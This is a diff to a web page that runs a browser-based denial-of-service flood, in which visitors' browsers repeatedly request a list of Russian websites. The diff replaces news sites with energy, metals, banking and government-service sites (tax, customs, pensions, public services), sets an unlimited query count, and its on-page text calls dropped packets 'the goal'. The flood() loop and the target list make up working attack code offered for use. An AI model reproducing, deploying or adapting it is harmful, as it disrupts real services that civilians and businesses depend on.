@@ -50,122 +50,49 @@
         Failed to fetch is normal - if any site has that - that means their servers are under load and are dropping
         packets - which is the goal!</h3>
     <div id="stats" class="stats">
-        <pre>{
-      "https://lenta.ru/": {
-        "number_of_requests": 0,
-        "number_of_errored_responses": 0,
-        "error_message": "Failed to fetch"
-      },
-      "https://ria.ru/": {
-        "number_of_requests": 0,
-        "number_of_errored_responses": 0,
-        "error_message": "Failed to fetch"
-      },
-      "https://ria.ru/lenta/": {
-        "number_of_requests": 0,
-        "number_of_errored_responses": 0,
-        "error_message": "Failed to fetch"
-      },
-      "https://www.rbc.ru/": {
-        "number_of_requests": 0,
-        "number_of_errored_responses": 0,
-        "error_message": "Failed to fetch"
-      },
-      "https://www.rt.com/": {
-        "number_of_requests": 0,
-        "number_of_errored_responses": 0,
-        "error_message": "Failed to fetch"
-      },
-      "http://kremlin.ru/": {
-        "number_of_requests": 0,
-        "number_of_errored_responses": 0,
-        "error_message": "Failed to fetch"
-      },
-      "http://en.kremlin.ru/": {
-        "number_of_requests": 0,
-        "number_of_errored_responses": 0,
-        "error_message": "Failed to fetch"
-      },
-      "https://smotrim.ru/": {
-        "number_of_requests": 0,
-        "number_of_errored_responses": 0,
-        "error_message": "Failed to fetch"
-      },
-      "https://tass.ru/": {
-        "number_of_requests": 0,
-        "number_of_errored_responses": 0,
-        "error_message": "Failed to fetch"
-      },
-      "https://tvzvezda.ru/": {
-        "number_of_requests": 0,
-        "number_of_errored_responses": 0,
-        "error_message": "Failed to fetch"
-      },
-      "https://vsoloviev.ru/": {
-        "number_of_requests": 0,
-        "number_of_errored_responses": 0,
-        "error_message": "Failed to fetch"
-      },
-      "https://www.1tv.ru/": {
-        "number_of_requests": 0,
-        "number_of_errored_responses": 0,
-        "error_message": "Failed to fetch"
-      },
-      "https://www.vesti.ru/": {
-        "number_of_requests": 0,
-        "number_of_errored_responses": 0,
-        "error_message": "Failed to fetch"
-      },
-      "https://online.sberbank.ru/": {
-        "number_of_requests": 0,
-        "number_of_errored_responses": 0,
-        "error_message": "Failed to fetch"
-      },
-      "https://sberbank.ru/": {
-        "number_of_requests": 0,
-        "number_of_errored_responses": 0,
-        "error_message": "Failed to fetch"
-      },  
-      "https://www.gosuslugi.ru/": {
-        "number_of_requests": 0,
-        "number_of_errored_responses": 0,
-        "error_message": "Failed to fetch"
-      },
-        "https://mil.ru": {
-        "number_of_requests": 0,
-        "number_of_errored_responses": 0,
-        "error_message": "Failed to fetch"
-      },
-        "https://iz.ru": {
-        "number_of_requests": 0,
-        "number_of_errored_responses": 0,
-        "error_message": "Failed to fetch"
-      }
-    }</pre>
+      <pre>
+        <!-- Logs -->
+      </pre>
     </div>
     <div id="errors"></div>
     <h1>If you missed it, BBC NEWS: Ukraine conflict: <a href="https://www.bbc.com/news/world-europe-60503037">Russian
             forces attack from three sides</a></h1>
     <script>
+        // set max queries restriction
+        let maxQueries = Infinity;
+        // Changed sites list
         var targets = {
-            'https://lenta.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://ria.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://ria.ru/lenta/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.rbc.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.rt.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://www.gazprom.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://lukoil.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://magnit.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://www.nornickel.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://www.surgutneftegas.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://www.tatneft.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://www.evraz.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://nlmk.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://www.sibur.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://www.severstal.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://www.metalloinvest.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://nangs.org/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://rmk-group.ru/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://www.tmk-group.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://ya.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://www.polymetalinternational.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://www.uralkali.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://www.eurosib.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://omk.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://www.sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://www.vtb.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://www.gazprombank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://www.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://www.mos.ru/uslugi/': { number_of_requests: 0, number_of_errored_responses: 0 },
             'http://kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'http://en.kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://smotrim.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://tass.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://tvzvezda.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://vsoloviev.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.1tv.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.vesti.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://online.sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://mil.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://iz.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'http://government.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://mil.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://www.nalog.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://customs.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://pfr.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://rkn.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
         }
 
         var statsEl = document.getElementById('stats');
@@ -192,7 +119,7 @@
         }
 
         async function flood(target) {
-            for (var i = 0; ; ++i) {
+            for (var i = 0; i < maxQueries; ++i) {
                 if (queue.length > CONCURRENCY_LIMIT) {
                     await queue.shift()
                 }
